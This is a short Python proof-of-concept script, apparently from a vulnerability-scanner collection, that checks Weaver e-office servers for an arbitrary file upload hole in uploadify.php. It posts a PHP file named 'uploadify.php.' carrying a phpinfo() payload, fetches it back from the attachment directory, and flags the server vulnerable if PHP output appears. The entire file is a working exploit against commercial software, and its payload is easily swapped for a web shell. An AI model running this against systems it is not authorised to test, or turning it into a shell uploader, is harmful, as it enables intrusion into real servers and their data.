import requests
import urllib


def verify(url):
    relsult = {
        'name': '泛微e-office-uploadify.php存在任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'null',
        'Content-Type': 'image/jpeg',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'Connection': 'close',
    }
    data = '''
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Content-Disposition: form-data; name="Fdiledata"; filename="uploadify.php."
        Content-Type: image/jpeg
         
        <?php phpinfo();?>
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
    '''
    vurl = urllib.parse.urljoin(url, "/inc/jquery/uploadify/uploadify.php")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            vurl = f"{url}/attachment/{response.text}/uploadify.php"
            response = requests.get(vurl)
            if response.status_code == 200 and 'PHP' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult
